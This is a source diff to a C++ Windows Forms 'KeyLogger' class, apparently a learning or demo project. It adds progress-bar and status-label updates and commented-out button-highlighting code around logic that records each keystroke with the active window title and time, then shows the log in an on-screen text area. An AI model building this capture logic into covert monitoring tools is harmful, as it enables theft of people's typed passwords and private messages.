@@ -1,4 +1,12 @@
 #include "KeyLogger.h"
+#include "Buttons.h"
+#include "StatusProgresBar.h"
+#include "StatusLabel.h"
+#include "WindowsNameComboBox.h"
+#include <string>
+#include <stdio.h>
+#include <stdlib.h>
+
 
 KeyLogger* KeyLogger::instance = nullptr;
 
@@ -32,7 +40,8 @@ void KeyLogger::log(std::string message)
 		//	layout = GetKeyboardLayout(NULL); //Get keyboard layout of this thread (always const)
 
 
-
+		StatusProgresBar::getProgressBar()->Value = 0;
+		StatusLabelToolStrip::getToolStripStatusLabel()->Text = "0%";
 
 
 		HKL layout{};
@@ -57,6 +66,7 @@ void KeyLogger::log(std::string message)
 				strftime(s, sizeof(s), "%c", tm);
 
 				oss << "\n\n[Window: " << window_title << " - at " << s << "] ";
+				//WindowsNameComboBox::getComboBox()->Items[1] = "windows_title";
 			}
 		}
 
@@ -64,8 +74,10 @@ void KeyLogger::log(std::string message)
 			oss << "[BACKSPACE]";
 		else if (key_stroke == VK_RETURN)
 			oss << "\n";
-		else if (key_stroke == VK_SPACE)
-			oss << " ";
+		else if (key_stroke == VK_SPACE) {
+			oss << "[SPACE]";
+			//Buttons::getButton()->Text = "Ya";
+		}
 		else if (key_stroke == VK_TAB)
 			oss << "[TAB]";
 		else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
@@ -106,13 +118,46 @@ void KeyLogger::log(std::string message)
 			//key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
 			key = MapVirtualKeyExW(key_stroke, MAPVK_VK_TO_CHAR, layout);
 
-
+			
 			//tolower converts it to lowercase properly
 			// tolower правильно перетворює його на lowercase
 			if (!lowercase) key = tolower(key);
 			oss << char(key);
+			char symbol = char(key);
+			std::string str;
+			str.push_back(symbol);
+			std::string str2;
+			//str2 = CastingUtils::castAsString(Buttons::getButton()->Text);
+			
+			//if (str == CastingUtils::castAsString(Buttons::getButtonD()->Text)) {
+			//	Buttons::getButtonD()->FlatAppearance->BorderSize = 3;
+			//}
+
+			//if (str == CastingUtils::castAsString(Buttons::getButton()->Text)) {
+			//	Buttons::getButton()->FlatAppearance->BorderSize = 3;
+			//}
+
+			//if (str == CastingUtils::castAsString(Buttons::getButtonF()->Text)) {
+			//	Buttons::getButtonF()->FlatAppearance->BorderSize = 3;
+			//	//Sleep(3000);
+			//}
 		}
-		KeyLoggedAreaHolder::getLoggedArea()->Text += "\n" + CastingUtils::castAsString(oss.str());
+		
+		//Sleep(2 * 1000);
+		
+		//Sleep(5000);
+		//Buttons::getButton()->BackColor = System::Drawing::Color::Black;
+		//Buttons::getButtonD()->FlatAppearance->BorderSize = 1;
+		//std::this_tgread
+		
+		KeyLoggedAreaHolder::getLoggedArea()->Text += CastingUtils::castAsString(oss.str()) + "\n";
+		//Sleep(1000);
+		/*Buttons::getButtonF()->Visible = false;
+		Buttons::getButtonF()->FlatAppearance->BorderSize = 1;
+		Buttons::getButtonF()->Visible = true;*/
+		StatusProgresBar::getProgressBar()->Value = 100;
+		StatusLabelToolStrip::getToolStripStatusLabel()->Text = "100%";
+
     }
 }
 
